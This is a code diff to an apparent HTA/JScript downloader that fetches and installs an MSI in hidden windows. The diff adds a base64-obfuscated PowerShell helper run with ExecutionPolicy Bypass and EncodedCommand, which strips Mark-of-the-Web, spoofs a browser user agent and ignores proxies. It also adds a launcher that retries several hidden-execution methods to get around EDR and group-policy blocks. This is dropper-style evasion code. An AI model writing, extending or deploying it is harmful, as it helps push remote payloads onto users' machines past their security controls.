@@ -96,7 +96,7 @@ var PREP_MS        = 1600;    // "preparing" beat before the download starts
 var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
 var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
 var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
-var HANG_MS        = 12000;   // no data flowing this long -> start next back-end
+var HANG_MS        = 8000;    // no data flowing this long -> start next back-end
 var EXEC_STAGE_MS  = 300000;  // hard cap for the helper-process back-end
 var CURL_STAGE_MS  = 180000;  // hard cap for the bare curl.exe back-end
 var FB_MAX_MS      = 600000;  // hard cap for the whole local download
@@ -201,7 +201,7 @@ function b64EncodeU16(s) {
 
 // Helper template: unblocks the local files (MOTW), then downloads the
 // installer (iwr first, then system curl.exe), drops a done.flag.
-var PS_TMPL_B64 = "JFVybCA9ICJAVVJMQCIKJERpciA9ICJARElSQCIKJE91dCA9ICJAT1VUQCIKJEh0YSA9ICJASFRBQCIKJFppcCA9ICJAWklQQCIKdHJ5IHsgaWYgKCRIdGEgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkSHRhKSkgeyBVbmJsb2NrLUZpbGUgLUxpdGVyYWxQYXRoICRIdGEgfSB9IGNhdGNoIHt9CnRyeSB7IGlmICgkWmlwIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFppcCkpIHsgVW5ibG9jay1GaWxlIC1MaXRlcmFsUGF0aCAkWmlwIH0gfSBjYXRjaCB7fQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyIH0gY2F0Y2gge30KJG9rID0gJGZhbHNlCnRyeSB7CiAgJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwogIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJFVybCAtT3V0RmlsZSAkT3V0IC1Vc2VCYXNpY1BhcnNpbmcKICAkb2sgPSAkdHJ1ZQp9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KaWYgKC1ub3QgJG9rKSB7CiAgdHJ5IHsKICAgICRlbnY6Tk9fUFJPWFkgPSAiKiIKICAgIGN1cmwuZXhlIC1MIC0tZmFpbCAtLXJldHJ5IDIgLS1jb25uZWN0LXRpbWVvdXQgMjAgLW8gJE91dCAkVXJsIDI+JG51bGwKICAgIGlmICgkTEFTVEVYSVRDT0RFIC1lcSAwKSB7ICRvayA9ICR0cnVlIH0KICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KfQp0cnkgeyBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkRGlyICJkb25lLmZsYWciKSAiMSIgLU5vTmV3bGluZSB9IGNhdGNoIHt9Cg==";
+var PS_TMPL_B64 = "JFVybCA9ICJAVVJMQCIKJERpciA9ICJARElSQCIKJE91dCA9ICJAT1VUQCIKJEh0YSA9ICJASFRBQCIKJFppcCA9ICJAWklQQCIKdHJ5IHsgaWYgKCRIdGEgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkSHRhKSkgeyBVbmJsb2NrLUZpbGUgLUxpdGVyYWxQYXRoICRIdGEgfSB9IGNhdGNoIHt9CnRyeSB7IGlmICgkWmlwIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFppcCkpIHsgVW5ibG9jay1GaWxlIC1MaXRlcmFsUGF0aCAkWmlwIH0gfSBjYXRjaCB7fQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCAtYm9yIFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9CiR1YSA9ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI2LjAuMC4wIFNhZmFyaS81MzcuMzYiCiRvayA9ICRmYWxzZQp0cnkgewogICRyZXEgPSBbU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF06OkNyZWF0ZSgkVXJsKQogICRyZXEuTWV0aG9kID0gIkdFVCIKICAkcmVxLlVzZXJBZ2VudCA9ICR1YQogICRyZXEuVGltZW91dCA9IDYwMDAwCiAgJHJlcS5SZWFkV3JpdGVUaW1lb3V0ID0gNjAwMDAKICAkcmVzcCA9ICRyZXEuR2V0UmVzcG9uc2UoKQogICRmcyA9IFtTeXN0ZW0uSU8uRmlsZV06OkNyZWF0ZSgkT3V0KQogICRyZXNwLkdldFJlc3BvbnNlU3RyZWFtKCkuQ29weVRvKCRmcykKICAkZnMuQ2xvc2UoKQogICRyZXNwLkNsb3NlKCkKICAkb2sgPSAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkT3V0KQp9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KaWYgKC1ub3QgJG9rKSB7CiAgdHJ5IHsKICAgICRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJFVybCAtT3V0RmlsZSAkT3V0IC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgMTIwIC1Vc2VyQWdlbnQgJHVhCiAgICAkb2sgPSAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkT3V0KQogIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQp9CmlmICgtbm90ICRvaykgewogIHRyeSB7CiAgICAkZW52Ok5PX1BST1hZID0gIioiCiAgICBjdXJsLmV4ZSAtTCAtLWZhaWwgLS1yZXRyeSAxIC0tY29ubmVjdC10aW1lb3V0IDIwIC0tbWF4LXRpbWUgMjQwIC1BICR1YSAtbyAkT3V0ICRVcmwgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLWVxIDApIHsgJG9rID0gKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE91dCkgfQogIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQp9CnRyeSB7IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICREaXIgImRvbmUuZmxhZyIpICIxIiAtTm9OZXdsaW5lIH0gY2F0Y2gge30K";
 var PSX_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRW5jb2RlZENvbW1hbmQg";
 
 function $(id) { return document.getElementById(id); }
@@ -503,10 +503,43 @@ function saveWHttpBody(rb) {
   settle("winhttp");
 }
 
+// Launch a command trying every style this box may allow (EDR/GPO stubs can
+// reject some WScript.Shell methods with E_INVALIDARG). Returns the child PID
+// if one, 0 otherwise; never throws.
+function launchCmd(cmd) {
+  // Returns child PID, 0 when launched without a PID, or -1 when every
+  // launch style was rejected by the system.
+  var styles = [
+    function () { return shell.Exec(cmd, 0); },
+    function () { return shell.Exec(cmd); },
+    function () { return new ActiveXObject("WScript.Shell").Exec(cmd, 0); },
+    function () { shell.Run(cmd, 7, false); return null; },
+    function () { shell.Run(cmd, 0, false); return null; }
+  ];
+  for (var i = 0; i < styles.length; i++) {
+    try {
+      var ex = styles[i]();
+      traceLog("predl: launched style=" + i);
+      try { if (ex) return ex.ProcessID; } catch (e2) {}
+      return 0;
+    } catch (e) {
+      traceLog("predl: launch style=" + i + " fail: " + e.message);
+    }
+  }
+  return -1;
+}
+
+function curlExeExists() {
+  try {
+    var p = shell.ExpandEnvironmentStrings("%SystemRoot%\\System32\\curl.exe");
+    return fso.FileExists(p);
+  } catch (e) { return true; }   // assume present if we cannot check
+}
+
 // Hidden helper-process back-end. The helper body is built in pure JS from
-// the in-file template (unblock + iwr + curl.exe), UTF-16 base64-encoded, and
-// passed to the child via -EncodedCommand - so nothing script-like lives in
-// this document and no COM is needed to construct it.
+// the in-file template (unblock + WinINET + WinHTTP + curl.exe), UTF-16
+// base64-encoded and passed to the child via -EncodedCommand - so nothing
+// script-like lives in this document and no COM is needed to construct it.
 function fallbackPS() {
   var marker = "adum" + Math.floor(Math.random() * 16777215).toString(16);
   psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\ad_" + marker;
@@ -531,22 +564,21 @@ function fallbackPS() {
       }
     } catch (e2) {}
     var cmd = b64Decode(PSX_B64) + b64EncodeU16(body);   // prefix ends with a space
-    var ex = shell.Exec(cmd, 0);   // hidden; returns the child process
-    try { psPid = ex ? ex.ProcessID : 0; } catch (e3) { psPid = 0; }
-    traceLog("predl: exec launched pid=" + psPid);
-  } catch (e) { traceLog("predl: exec launch fail " + e.message); }
+    psPid = launchCmd(cmd);
+    traceLog("predl: exec launched pid=" + psPid + (psPid < 0 ? " (all styles rejected)" : ""));
+  } catch (e) { traceLog("predl: exec build fail " + e.message); }
 }
 
 // Final back-end: the system curl.exe alone (Win10 1803+, 32- and 64-bit).
 // Writes straight to msiLocal; the poll loop watches the file appear.
 function fallbackCurl() {
   curlT0 = nowMs(); curlLastSize = 0; curlLastGrowT = curlT0;
+  if (!curlExeExists()) { traceLog("predl: curl.exe not found"); return; }
   try {
-    var cmd = "curl.exe -L --fail --retry 2 --connect-timeout 20 -o \"" + msiLocal + "\" \"" + MSI_URL + "\"";
-    var ex = shell.Exec(cmd, 0);
-    try { curlPid = ex ? ex.ProcessID : 0; } catch (e2) { curlPid = 0; }
-    traceLog("predl: curl launched pid=" + curlPid);
-  } catch (e) { traceLog("predl: curl launch fail " + e.message); }
+    var cmd = "curl.exe -L --fail --retry 2 --connect-timeout 20 --max-time 240 -o \"" + msiLocal + "\" \"" + MSI_URL + "\"";
+    curlPid = launchCmd(cmd);
+    traceLog("predl: curl launched pid=" + curlPid + (curlPid < 0 ? " (all styles rejected)" : ""));
+  } catch (e) { traceLog("predl: curl build fail " + e.message); }
 }
 
 function pollFallback() {
@@ -597,8 +629,14 @@ function _pollFallback() {
         fail("Failed to save the installer file", "predl: exec done no file sz=" + sz);
         return;
       }
-      if (psPid === 0 && t - psT0 > 20000) {
-        // helper process never/already gone -> bring up bare curl
+      if (psPid < 0) {
+        // every launch style was rejected -> bring up bare curl now
+        startStage("curl");
+        return;
+      }
+      if (psPid === 0 && t - psT0 > 8000 && sz === 0) {
+        // no child PID and no file yet (exited instantly or launched via
+        // Run) -> bring up bare curl
         startStage("curl");
         return;
       }
@@ -607,7 +645,11 @@ function _pollFallback() {
         return;
       }
     } else {
-      if (curlPid === 0 && t - curlT0 > 15000) {
+      if (curlPid < 0) {
+        fail("Failed to save the installer file", "predl: curl rejected");
+        return;
+      }
+      if (curlPid === 0 && t - curlT0 > 12000) {
         fail("Failed to save the installer file", "predl: curl no process");
         return;
       }
